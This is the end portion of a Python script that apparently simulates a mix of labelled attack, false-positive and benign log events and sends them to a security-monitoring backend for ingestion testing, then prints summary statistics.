                        ("Reverse Shell Spawned", gen_tp_reverse_shell),
                        ("Suspicious RDP Login", gen_tp_suspicious_rdp),
                        ("FTP Data Exfiltration", gen_tp_data_exfiltration_ftp),
                        ("WannaCry Propagation", gen_tp_wannacry_prop)
                    ])
                    scenario_name, generator = attack_type
                    print(f"{BOLD}{RED}[ATTACK] Generating Malicious Sequence: {scenario_name}{RESET}")
                    logs_to_send.extend(generator())
                    count_tp += 1
                    
                else:
                    # General Scenario (Benign or False Positive)
                    roll_fp = random.random()
                    if roll_fp < 0.25: # 25% chance of False Positive, 75% benign
                        # False Positive Scenario
                        fp_type = random.choice([
                            ("SQLi False Positive Search", gen_fp_sqli),
                            ("XSS False Positive Code Snippet", gen_fp_xss),
                            ("Scan False Positive Health Check", gen_fp_scan)
                        ])
                        scenario_name, generator = fp_type
                        print(f"{BOLD}{YELLOW}[FALSE POSITIVE] Generating: {scenario_name}{RESET}")
                        logs_to_send.append(generator())
                        count_fp += 1
                    else:
                        # Benign Scenario
                        benign_type = random.choice([
                            ("Accepted SSH Auth Login", gen_benign_auth),
                            ("Normal GET/POST Web Request", gen_benign_web),
                            ("Cron / Disk System Status Update", gen_benign_system),
                            ("Outbound Routing Firewall Rule", gen_benign_firewall)
                        ])
                        scenario_name, generator = benign_type
                        print(f"{GREEN}[BENIGN] Generating: {scenario_name}{RESET}")
                        logs_to_send.append(generator())
                        count_benign += 1
            
            # Always mix in a realistic stream of background benign logs so they are never 0
            num_background_benign = random.randint(2, 5)
            for _ in range(num_background_benign):
                benign_type = random.choice([
                    ("Accepted SSH Auth Login", gen_benign_auth),
                    ("Normal GET/POST Web Request", gen_benign_web),
                    ("Cron / Disk System Status Update", gen_benign_system),
                    ("Outbound Routing Firewall Rule", gen_benign_firewall)
                ])
                _, generator = benign_type
                logs_to_send.append(generator())
                count_benign += 1
                
            # Mix in occasional background false positives (15% chance per batch)
            if random.random() < 0.15:
                fp_type = random.choice([
                    ("SQLi False Positive Search", gen_fp_sqli),
                    ("XSS False Positive Code Snippet", gen_fp_xss),
                    ("Scan False Positive Health Check", gen_fp_scan)
                ])
                _, generator = fp_type
                logs_to_send.append(generator())
                count_fp += 1
            
            if logs_to_send:
                # Print brief message preview
                for log in logs_to_send:
                    print(f"  -> Msg: {log['message']}")
                    
                # Save logs locally for further analysis
                try:
                    with open("simulation_history.jsonl", "a") as f:
                        for log in logs_to_send:
                            # Attach metadata indicating type/scenario
                            log_copy = log.copy()
                            log_copy["simulation_metadata"] = {
                                "scenario_type": "ATTACK" if is_critical else "GENERAL",
                                "scenario_name": scenario_name
                            }
                            f.write(json.dumps(log_copy) + "\n")
                except Exception as e:
                    print(f"  {RED}Error saving log locally: {e}{RESET}")
                    
                # Send to backend
                status, res = send_logs(args.url, logs_to_send, args.async_mode)
                
                if status == 201:
                    print(f"  {BOLD}{CYAN}Response: Status 201 Created | Ingested: {res.get('count', 0)} log(s) | Result: {res.get('status')}{RESET}")
                else:
                    print(f"  {BOLD}{RED}Response ERROR (Status {status}): {res}{RESET}")
            
    except KeyboardInterrupt:
        print(f"\n{BOLD}{YELLOW}Simulation suspended by user.{RESET}")
    finally:
        total_time = time.time() - start_time
        print(f"\n{BOLD}{BLUE}======================================{RESET}")
        print(f"{BOLD}{BLUE}[STATS] Simulation Summary: {RESET}")
        print(f"{BOLD}{BLUE}======================================{RESET}")
        print(f"Total Run Time         : {total_time:.2f} seconds")
        print(f"Benign Logs Generated  : {GREEN}{count_benign}{RESET}")
        print(f"False Positives        : {YELLOW}{count_fp}{RESET}")
        print(f"Attack Sequences Run   : {RED}{count_tp}{RESET}")
        print(f"{BOLD}{BLUE}======================================{RESET}\n")

if __name__ == "__main__":
    main()
